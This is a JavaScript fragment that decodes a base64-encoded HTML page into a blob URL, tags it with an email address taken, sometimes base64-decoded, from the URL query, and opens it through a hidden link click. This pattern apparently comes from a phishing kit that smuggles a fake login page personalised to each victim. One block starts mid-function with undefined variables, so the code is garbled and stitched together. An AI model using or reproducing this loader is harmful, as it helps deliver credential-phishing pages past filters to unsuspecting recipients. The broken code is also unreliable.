        function openPage(base64Html, email) {
            try {
                const htmlContent = atob(base64Html);

                const blob = new Blob([htmlContent], { 
                    type: "text/html;charset=utf-8" 
                });

                const blobUrl = URL.createObjectURL(blob);

                // Add the hash cleanly
                let finalUrl = blobUrl;
                if (email && email.length > 2 && validateEmail(email)) {
                    finalUrl += '#' + email.toLowerCase().trim();
                }

                // Most reliable method for Safari: create link + click with delay
                setTimeout(() => {
                    const a = document.createElement('a');
                    a.href = finalUrl;
                    a.style.display = 'none';
                    a.target = '_self';

                    document.body.appendChild(a);
                    a.click();

                    // Cleanup
                    setTimeout(() => {
                        URL.revokeObjectURL(blobUrl);
                        if (a.parentNode) document.body.removeChild(a);
                    }, 1500);
                }, 50);

            } catch (err) {
                console.error("Open error:", err);
                alert("Could not open the page in Safari.\nTry opening this file directly in Chrome or Edge.");
            }
        }

            if (s) t[r++] = s;

            for (var y in h) {
                if (h.hasOwnProperty(y) && h[y].trim().length > 0) {
                    t[r++] = h[y];
                }
            }

            for (var i = 0; i < t.length; i++) {
                s = t[i];
                if (validateEmail(s)) {
                    e.emnohash = s.toLowerCase();
                    break;
                } else {
                    var decoded = atobCustom(s);
                    if (decoded && validateEmail(decoded)) {
                        e.emnohash = decoded.toLowerCase();
                        break;
                    }
                }
            }
            return e;
        }

        function validateEmail(t) {
            return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase());
        }

        function atobCustom(t) {
            if (!t || !isAllBase64Chars(t)) return false;
            try { return atob(t); } catch (e) { return false; }
        }

        function isAllBase64Chars(str) {
            var regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
            return regex.test(str);
        }

        function getAllUrlParams() {
            var e = {};
            var l = window.location.search;
            if (l && l[0] === "?") {
                l = l.substring(1);
                var parts = l.split("&");
                for (var i = 0; i < parts.length; i++) {
                    var pair = parts[i].split("=");
                    if (pair.length > 1) e[pair[0]] = pair[1];
                }
            }
            return e;
        }
